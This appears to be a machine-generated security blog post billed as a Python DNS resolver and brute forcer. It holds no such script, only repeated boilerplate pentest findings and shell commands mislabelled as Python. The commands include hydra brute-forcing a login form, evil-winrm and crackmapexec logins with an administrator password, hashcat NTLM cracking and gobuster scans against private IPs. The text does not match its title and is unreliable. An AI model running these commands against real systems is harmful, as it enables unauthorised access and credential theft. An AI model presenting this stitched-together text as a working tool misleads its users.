---
TitleSEO: "DNS Resolver and Brute Forcer in Python | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Python"
Author: "ZureFX"
Description: "A Python script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "rust, python, bash, powershell, scanner, automation"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-892.html"
URL_IMAGES: ""
Date: "2025-06-03"
Tags: "Rust, Python, Bash, PowerShell, Scanner, Automation"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-892"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-892.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `sharphound`
- `sharphound`
- `smbclient`

## Implementation

### Core Logic

Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.30.244.39 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

```python
evil-winrm -i 10.54.234.223 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.91.206.179/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
evil-winrm -i 10.66.142.100 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.101.142.79/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.103.142.237 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.86.127.111 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.72.102.228 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 26.58s
```
